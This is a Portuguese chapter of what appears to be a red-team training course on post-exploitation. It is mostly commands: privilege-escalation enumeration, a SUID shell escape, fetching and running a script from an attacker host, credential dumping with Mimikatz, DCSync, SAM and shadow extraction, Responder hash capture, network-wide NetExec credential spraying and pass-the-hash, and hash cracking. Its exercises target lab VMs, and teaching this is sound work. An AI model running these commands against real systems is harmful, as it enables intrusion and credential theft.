# 07 · Pós-Exploração

> [← Anterior: Exploração](../06-exploracao/README.md) · [Voltar ao índice](../../README.md) · [Próximo: Lateral & Persistência →](../08-lateral-persistencia/README.md)

---

## Princípio

Acesso inicial obtido. Agora: **escalar privilégios**, **coletar credenciais** e **mapear o que está ao redor** antes de se mover.

---

## 1. Enumeração Local Automatizada

### Linux — LinPEAS

Script legendário. Roda tudo relevante para privesc em uma única execução.

```bash
# Baixar (a partir do host atacante)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Upload para o alvo via reverse shell:
# No atacante: python3 -m http.server 8000
# No alvo:     wget http://SEU_IP:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# Execução com saída colorida salva:
./linpeas.sh -a | tee linpeas.out
```

Cores importantes:
- **Vermelho/Amarelo** — potencial privesc
- **Amarelo** — info interessante
- **Verde** — info padrão

### Linux — Linux Exploit Suggester (LES)

```bash
./linux-exploit-suggester.sh
./linux-exploit-suggester-2.pl
```

Sugere exploits de kernel baseados em `uname -a`.

### Linux — GTFOBins

Não é uma ferramenta — é uma **referência** essencial: [gtfobins.github.io](https://gtfobins.github.io).

Mostra como abusar de binários legítimos (`tar`, `find`, `vim`, `less`, `perl`, etc.) para:
- Escapar restricted shells
- Ler arquivos privilegiados
- Executar comandos via SUID
- Manter privilégios

Exemplo — SUID no `find`:
```bash
find . -exec /bin/sh -p \; -quit
```

### Windows — WinPEAS

```powershell
# Baixe winPEASx64.exe
.\winPEASx64.exe
```

### Windows — PowerUp

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

### Windows — Seatbelt

Enumera informações detalhadas do sistema Windows (útil para situational awareness).

```powershell
Seatbelt.exe -group=all
```

### Windows — SharpUp

Versão C# do PowerUp, bypassa AMSI melhor.

```powershell
SharpUp.exe audit
```

---

## 2. Checks Manuais Clássicos (Linux)

Mesmo com LinPEAS, sempre verifique manualmente:

```bash
# Usuário e grupos
id; whoami; groups

# Sudoers
sudo -l                                          # o que posso rodar sem senha?
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/

# SUID
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-timers --all

# Arquivos writable em paths perigosos
find /etc -writable -type f 2>/dev/null
find / -writable -path '*/bin/*' 2>/dev/null

# Processos rodando como root
ps aux | grep root

# Portas abertas localmente (não visíveis externamente)
ss -tlnp
netstat -tlnp

# Kernel
uname -a
cat /etc/os-release
```

---

## 3. Checks Manuais Clássicos (Windows)

```powershell
# Usuário e privilégios
whoami /all
whoami /priv
net user %USERNAME%

# Software instalado
Get-WmiObject -Class Win32_Product

# Serviços mal configurados
Get-Service | Where-Object {$_.Status -eq "Running"}
accesschk.exe -uwcqv "Authenticated Users" *

# Scheduled tasks
schtasks /query /fo LIST /v

# Stored credentials
cmdkey /list
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials

# AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

---

## 4. Dump de Credenciais

### Windows — Mimikatz

**A ferramenta mais famosa do Red Team Windows.**

```
privilege::debug
sekurlsa::logonpasswords                # senhas em memória
sekurlsa::tickets /export                # dump Kerberos tickets
lsadump::sam                             # hashes locais (offline: precisa de SAM+SYSTEM)
lsadump::secrets                         # LSA secrets
lsadump::dcsync /domain:CORP /user:krbtgt  # via DCSync (exige privs)
```

Variantes:
- **Pypykatz** — Mimikatz em Python (cross-platform, parses dumps offline)
- **SharpKatz** — versão C#, melhor em memória

### Windows — dump do SAM (offline)

```powershell
# No alvo (como admin):
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

# Baixe os dois arquivos, depois:
pypykatz registry --sam sam.save system.save
# ou
samdump2 system.save sam.save
```

### Linux — shadow + passwd

```bash
# Se tiver acesso root ou capability cap_dac_read_search
unshadow /etc/passwd /etc/shadow > hashes.txt
```

### Multi-fonte — LaZagne

Recupera credenciais armazenadas em aplicações: browsers, email clients, DBs, WiFi.

```bash
# Linux
python3 laZagne.py all

# Windows
lazagne.exe all
```

### Na rede — Responder

Captura hashes NTLMv2 via LLMNR/NBT-NS/mDNS poisoning.

```bash
sudo responder -I eth0 -wrf
```

Hashes capturados vão para `/usr/share/responder/logs/*.txt` — alimente direto no Hashcat.

### Na rede — CrackMapExec / NetExec (nxc)

**NetExec** (fork ativo do CME, padrão em 2025+):

```bash
# Validar credenciais em toda a rede
nxc smb 10.0.0.0/24 -u admin -p 'Pass123'

# Dump SAM em todos os hosts
nxc smb 10.0.0.0/24 -u admin -p 'Pass123' --sam

# Dump LSA
nxc smb 10.0.0.0/24 -u admin -p 'Pass123' --lsa

# Pass-the-hash
nxc smb 10.0.0.0/24 -u admin -H AAD3B435B51404EE:ABCD... --sam

# Executar comando
nxc smb 10.0.0.0/24 -u admin -p 'Pass123' -x "whoami"
```

---

## 5. Quebra de Hashes

### Hashcat — GPU, muito rápido

```bash
# NTLM (Windows)
hashcat -m 1000 hashes.txt rockyou.txt

# NTLMv2 (capturado pelo Responder)
hashcat -m 5600 hash.txt rockyou.txt

# Kerberos (Kerberoast)
hashcat -m 13100 spn-hashes.txt rockyou.txt

# MD5
hashcat -m 0 hashes.txt rockyou.txt

# Linux shadow (SHA-512)
hashcat -m 1800 shadow.txt rockyou.txt

# Com regras (muito mais eficaz)
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# Mask attack
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?l?d?d    # Aaaaaa99
```

Modos comuns:

| `-m` | Tipo |
|---|---|
| 0 | MD5 |
| 100 | SHA-1 |
| 1000 | NTLM |
| 1800 | SHA-512 crypt (Linux) |
| 5600 | NetNTLMv2 |
| 13100 | Kerberos TGS-REP (Kerberoast) |
| 18200 | Kerberos AS-REP (AS-REP Roast) |
| 22000 | WPA-PBKDF2-PMKID+EAPOL |

Referência completa: `hashcat --help | grep -i <nome>`.

### John the Ripper — CPU, mais versátil

```bash
john --wordlist=rockyou.txt hashes.txt
john --format=NT hashes.txt --wordlist=rockyou.txt
john --incremental hashes.txt                    # sem wordlist
john --show hashes.txt                           # mostra já quebrados
```

`unshadow`, `zip2john`, `rar2john`, `ssh2john`, `keepass2john` — converte diversos formatos para hashes que o John entende.

---

## 6. Situational Awareness Checklist

Depois de obter acesso, **antes de se mover**, levante:

- [ ] Quem sou eu? (`whoami`, `id`)
- [ ] Onde estou? (hostname, interfaces, domínio)
- [ ] Quem mais está logado? (`w`, `who`, `qwinsta`)
- [ ] Quais processos rodam? (`ps auxf`, `tasklist /v`)
- [ ] O que está ouvindo localmente? (`ss -tlnp`, `netstat -tlnp`)
- [ ] Qual é a rede interna? (`ip a`, `ipconfig /all`, `route`)
- [ ] Qual o AV/EDR? (tasks rodando, paths em `Program Files`)
- [ ] Tem backup/sync cloud? (`~/.aws/`, `~/.ssh/`, `~/.kube/`)
- [ ] Senhas em arquivos? (`grep -r password /var/www 2>/dev/null`)

---

## Exercícios

1. Numa VM Linux vulnerável (ex.: [HackTheBox — Academy](https://academy.hackthebox.com) ou [Kioptrix](https://vulnhub.com)), rode LinPEAS e escale para root.
2. Capture um hash NTLMv2 com Responder numa rede de laboratório e quebre com Hashcat + rockyou.
3. Execute Mimikatz em uma VM Windows de laboratório e documente o output de `sekurlsa::logonpasswords`.

---

[← Anterior: Exploração](../06-exploracao/README.md) · [Voltar ao índice](../../README.md) · [Próximo: Lateral & Persistência →](../08-lateral-persistencia/README.md)
